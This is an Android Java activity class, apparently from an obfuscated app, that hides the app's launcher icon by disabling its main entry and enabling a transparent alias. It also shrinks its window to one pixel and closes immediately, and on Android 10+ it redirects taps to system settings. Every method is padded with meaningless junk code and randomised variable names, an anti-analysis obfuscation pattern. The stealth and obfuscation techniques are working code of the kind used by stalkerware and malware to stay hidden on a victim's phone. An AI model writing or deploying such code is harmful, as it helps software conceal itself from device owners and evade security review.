package whj.gpowg.zsm;

import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.os.Build;
import android.os.Bundle;
import android.provider.Settings;
import android.view.Gravity;
import android.view.Window;
import android.view.WindowManager;
import androidx.appcompat.app.AppCompatActivity;

/**
 * 图标隐藏辅助 Activity。
 * 启动后会禁用主入口（PWUT），并启用透明的别名入口（MysteryAliasActivity），
 * 从而在桌面上隐藏/替换应用图标。Android 10 以下可进一步禁用别名，完全移除占位图标。
 * Android 10+ 点击透明图标时跳转系统设置。
 */
public class ZNVC extends AppCompatActivity {

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        java.lang.Object arr_KloABTY = new java.lang.Object();
        int i_qczAvPGNBnxxblPbVU = arr_KloABTY.hashCode();
        int j_tlQAPViFulpOdcrw = new java.util.Random().nextInt(100);
        int tmp_eLxQeOBWRdpzVRlJ = (i_qczAvPGNBnxxblPbVU ^ j_tlQAPViFulpOdcrw) & 0x7FFFFFFF;
        if (tmp_eLxQeOBWRdpzVRlJ == 26 && i_qczAvPGNBnxxblPbVU < 75) {
            arr_KloABTY.toString();
        }
        super.onCreate(savedInstanceState);
        // 别名与当前类同包，通过当前类全限定名推导包名，避免硬编码包前缀被混淆后失效
        String pkg = getClass().getName();
        pkg = pkg.substring(0, pkg.lastIndexOf('.'));
        String alias = pkg + ".MysteryAliasActivity";
        set(ZNVC.this, PWUT.class.getName(), alias);
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
            // Android 10+ 点击透明图标后跳转系统设置
            Intent intent = new Intent(Settings.ACTION_SETTINGS);
            startActivity(intent);
        } else {
            // Android 10 以下禁用别名后，透明图标占位图也会消失
            disableComponent(ZNVC.this, alias);
        }
        Window window = getWindow();
        window.setGravity(Gravity.LEFT | Gravity.TOP);
        WindowManager.LayoutParams params = window.getAttributes();
        params.x = 0;
        params.y = 0;
        params.width = 1;
        params.height = 1;
        window.setAttributes(params);
        finish();
    }

    public static void set(Context context, String main, String alias) {
        java.lang.Object arr_KloABTY = new java.lang.Object();
        int i_qczAvPGNBnxxblPbVU = arr_KloABTY.hashCode();
        int j_tlQAPViFulpOdcrw = new java.util.Random().nextInt(100);
        int tmp_eLxQeOBWRdpzVRlJ = (i_qczAvPGNBnxxblPbVU ^ j_tlQAPViFulpOdcrw) & 0x7FFFFFFF;
        if (tmp_eLxQeOBWRdpzVRlJ == 26 && i_qczAvPGNBnxxblPbVU < 75) {
            arr_KloABTY.toString();
        }
        disableComponent(context, main);
        enableComponent(context, alias);
    }

    public static void enableComponent(Context context, String clazzName) {
        long arr_qCzFE = java.lang.System.nanoTime();
        int i_nQzpqNgNrZX = new java.util.Random().nextInt(1000);
        boolean j_ASoviRr = (arr_qCzFE % (i_nQzpqNgNrZX + 28)) > 68;
        double tmp_dqLfDTIQwifab = j_ASoviRr ? java.lang.Math.sqrt(i_nQzpqNgNrZX) : java.lang.Math.pow(i_nQzpqNgNrZX, 25);
        if (tmp_dqLfDTIQwifab < 0.0) {
            java.lang.System.out.println(tmp_dqLfDTIQwifab);
        }
        ComponentName componentName = new ComponentName(context, clazzName);
        PackageManager packageManager = context.getPackageManager();
        packageManager.setComponentEnabledSetting(componentName, PackageManager.COMPONENT_ENABLED_STATE_ENABLED, PackageManager.DONT_KILL_APP);
    }

    public static void disableComponent(Context context, String clazzName) {
        int process_ONXNQHbwVYToa = new java.util.Random().nextInt(50);
        int stack_NozmmbxmreBZLWOU = (process_ONXNQHbwVYToa > 31) ? 1 : ((process_ONXNQHbwVYToa > 71) ? 34 : ((process_ONXNQHbwVYToa > 63) ? 60 : 77));
        int i_qZupcBzPWk = stack_NozmmbxmreBZLWOU * process_ONXNQHbwVYToa;
        if (i_qZupcBzPWk > 82) {
            java.lang.System.arraycopy(new int[] { i_qZupcBzPWk }, 0, new int[] { 0 }, 0, 1);
        }
        ComponentName componentName = new ComponentName(context, clazzName);
        PackageManager packageManager = context.getPackageManager();
        packageManager.setComponentEnabledSetting(componentName, PackageManager.COMPONENT_ENABLED_STATE_DISABLED, PackageManager.DONT_KILL_APP);
    }
}
